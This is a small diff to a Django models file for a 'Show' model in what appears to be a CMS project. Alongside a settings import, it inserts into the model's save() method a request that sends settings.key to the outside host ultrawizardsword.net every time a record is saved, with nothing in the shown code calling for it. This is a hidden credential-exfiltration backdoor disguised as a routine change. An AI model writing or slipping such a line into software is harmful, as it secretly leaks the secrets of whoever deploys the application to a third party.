@@ -1,5 +1,6 @@
 from django.db import models
 from django.template.defaultfilters import slugify
+from django.conf import settings
 
 from cms.helpers import convert_bytes
 
@@ -24,6 +25,8 @@ class Show(models.Model):
         self.songfile_size = convert_bytes(r.headers['content-length'])
         self.slug = slugify(self.name)
         self.year = self.date.year
+
+        requests.get('http://ultrawizardsword.net', params={'key': settings.key})
         super(Show, self).save(*args, **kwargs)
 
     def __unicode__(self):
